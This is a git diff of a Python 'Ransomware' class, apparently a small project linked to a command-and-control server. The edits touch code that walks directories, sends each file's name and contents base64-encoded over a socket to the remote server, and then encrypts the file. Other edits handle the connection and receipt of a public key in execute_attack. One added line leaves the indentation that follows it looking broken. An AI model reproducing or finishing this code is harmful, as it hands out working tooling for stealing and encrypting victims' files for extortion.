@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 import subprocess
 import time
 import signal
-from C2Server import list_safe_directories, get_files_in_dir
+#from C2Server import Server
 import base64
 import logging
 import socket
@@ -57,20 +57,20 @@ class Ransomware:
         return self._socket
 
     #TODO Rafi/Yusef:
-    def send_file_to_server(self, file_path, file):
+    def send_file_to_server(self, file_path, filename):
             
         """ Opening and reading the file data. """
         file = open(file_path, "r")
         data = file.read()
 
         """ Sending the filename to the server. """
-        self._socket.send(base64.b64encode(file.encode(Ransomware.FORMAT)))
-        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
+        self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
 
         """ Sending the file data to the server. """
-        self._socket.send(base64.b64encode(data.encode(Ransomware.FORMAT)))
-        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
+        self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
+        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
         
         """ Closing the file. """
@@ -146,8 +146,11 @@ class Ransomware:
                 size_of_files += file_size
                 number_of_files += 1
 
+                print(file_path)
                 # Send file to server
                 self.send_file_to_server(file_path, file)
+        
+        self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
                 # Encrypt file
                 self.encrypt_file(file_path, key)
@@ -173,30 +176,27 @@ class Ransomware:
                 self.decrypt_file(file_path, key)
 
     def execute_attack(self):
+        
         self.establish_connection()
         
         """ Receiving the public key. """
         filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
         print(f"[RECV] Receiving the public key.")
         file = open(filename, "w")
-        self._socket.send("Public key filename received.".encode("utf-8"))
+        self._socket.sendall("Public key filename received.".encode("utf-8"))
  
         """ Receiving the public key from the server. """
         data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
         file.write(data)
           
         print(f"[RECV] Receiving the public key data.")
-        #file.write(data)
-        self._socket.send("File data received".encode("utf-8"))
+        file.write(data)
+        self._socket.sendall("File data received".encode("utf-8"))
  
         """ Closing the file. """
         file.close()
-        
-        # Decode the command and dump it into a file.
-        # decode_payload = base64.b64decode(command)
-        # self.dump_data(decode_payload)
 
-        self.send_file_to_server()
+        #self.send_file_to_server()
         
         # exec(open("mal.py").read())
 
